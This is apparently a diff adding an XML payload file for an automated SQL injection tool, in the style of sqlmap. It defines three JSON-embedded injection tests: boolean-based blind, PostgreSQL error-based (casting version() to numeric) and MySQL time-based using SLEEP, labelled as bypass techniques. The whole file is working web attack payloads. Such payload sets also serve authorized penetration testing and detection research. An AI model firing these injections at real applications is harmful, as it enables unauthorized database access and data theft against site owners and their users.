@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+    <!-- JSON-Based SQL Injection Tests (2025/2026 Bypass Techniques) -->
+    <test>
+        <title>JSON boolean-based blind - WHERE clause</title>
+        <stype>1</stype> <!-- Boolean -->
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>3</where>
+        <vector>{"[ORIGKEY]": "[ORIGVALUE]\" AND (SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END))-- -"}</vector>
+        <request>
+            <payload>{"[ORIGKEY]": "[ORIGVALUE]\" AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))-- -"}</payload>
+        </request>
+        <response>
+            <comparison>{"[ORIGKEY]": "[ORIGVALUE]\" AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END))-- -"}</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>JSON Error-Based - PostgreSQL</title>
+        <stype>2</stype> <!-- Error -->
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>3</where>
+        <vector>{"[ORIGKEY]": "[ORIGVALUE]\" AND CAST((SELECT [INFERENCE]) AS NUMERIC)-- -"}</vector>
+        <request>
+            <payload>{"[ORIGKEY]": "[ORIGVALUE]\" AND CAST((SELECT version()) AS NUMERIC)-- -"}</payload>
+        </request>
+        <response>
+            <grep>invalid input syntax for type numeric</grep>
+        </response>
+    </test>
+
+    <test>
+        <title>JSON Time-Based - MySQL</title>
+        <stype>5</stype> <!-- Time -->
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>3</where>
+        <vector>{"[ORIGKEY]": "[ORIGVALUE]\" AND (SELECT * FROM (SELECT(SLEEP([RANDTIME])))[RANDSTR])-- -"}</vector>
+        <request>
+            <payload>{"[ORIGKEY]": "[ORIGVALUE]\" AND (SELECT * FROM (SELECT(SLEEP([RANDTIME])))[RANDSTR])-- -"}</payload>
+        </request>
+        <response>
+            <time>[RANDTIME]</time>
+        </response>
+    </test>
+</root>
